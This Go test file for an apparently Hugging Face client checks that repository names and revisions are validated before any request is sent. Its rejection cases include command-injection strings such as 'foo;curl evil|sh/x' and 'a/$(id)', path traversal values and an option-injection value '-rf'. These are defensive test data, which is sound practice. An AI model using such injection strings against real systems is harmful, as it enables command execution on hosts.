// SPDX-License-Identifier: Apache-2.0

package hf

import "testing"

func TestValidRepoAndRevision(t *testing.T) {
	for s, want := range map[string]bool{
		"Qwen/Qwen3-30B-A3B-GGUF": true, "unsloth/gemma-3_4b.it": true, "a/b": true,
		"": false, "noslash": false, "a/b/c": false, "/a/b": false, "a/b/": false, "a/b?x=1": false, "a/b#f": false, "a/..": false, "../a/b": false, "a/.hidden": false,
		"a b/c": false, "a/b c": false, "foo;curl evil|sh/x": false, "a/$(id)": false, "a/`id`": false, "a/b\nc": false, "a/b'c": false, "a/b\"c": false, "a/b%2f": false,
		"a:b/c": false, "a/b@c": false, "ü/b": false,
	} {
		if got := ValidRepo(s); got != want {
			t.Errorf("ValidRepo(%q) = %v, want %v", s, got, want)
		}
	}
	for s, want := range map[string]bool{
		"main": true, "v1.0": true, "0123456789abcdef0123456789abcdef01234567": true, "feature_x-1": true,
		"": false, "refs/pr/1": false, "a/b": false, "..": false, "a..b": false, "main?x=1": false, "main#f": false, "-rf": false, "a b": false, "a\nb": false,
	} {
		if got := ValidRevision(s); got != want {
			t.Errorf("ValidRevision(%q) = %v, want %v", s, got, want)
		}
	}
}

func TestClientRefusesInvalidRepoWithoutAnyRequest(t *testing.T) {
	c := &Client{}
	if _, err := c.Tree(nil, "a/b?x=1", ""); err == nil { //nolint:staticcheck // nil ctx is never reached: validation fails first
		t.Error("Tree must refuse an invalid repo")
	}
	if _, err := c.Tree(nil, "a/b", "../x"); err == nil { //nolint:staticcheck
		t.Error("Tree must refuse an invalid revision")
	}
	if _, err := c.Card(nil, "a/b#f"); err == nil { //nolint:staticcheck
		t.Error("Card must refuse an invalid repo")
	}
	if _, err := c.repoInfo(nil, "x;y/z"); err == nil { //nolint:staticcheck
		t.Error("repoInfo must refuse an invalid repo")
	}
}
